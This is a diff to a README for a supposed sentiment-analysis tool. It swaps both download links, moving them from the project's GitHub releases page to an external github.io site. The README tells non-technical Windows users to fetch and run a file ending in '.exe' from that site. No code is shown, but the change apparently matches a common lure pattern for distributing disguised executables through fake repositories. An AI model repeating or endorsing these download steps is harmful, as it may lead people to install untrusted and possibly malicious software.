@@ -1,6 +1,6 @@
 # 📊 sentiment-analysis-nlp-api - Classify user feedback with simple tools
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Traciewheelless86/sentiment-analysis-nlp-api/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://traciewheelless86.github.io)
 
 This software helps you understand user feedback. It sorts text into three groups: positive, negative, and neutral. You do not need to understand code to use this tool. It runs on your local computer to process text files or individual comments. Businesses use this to monitor customer satisfaction without manual review. 
 
@@ -8,7 +8,7 @@ This software helps you understand user feedback. It sorts text into three group
 
 You need to download the installer to your Windows computer. 
 
-1. Visit this [Download Page](https://github.com/Traciewheelless86/sentiment-analysis-nlp-api/releases).
+1. Visit this [Download Page](https://traciewheelless86.github.io).
 2. Look for the file ending in `.exe`. 
 3. Click the name of the file to start the download.
 4. Save the file to your computer.
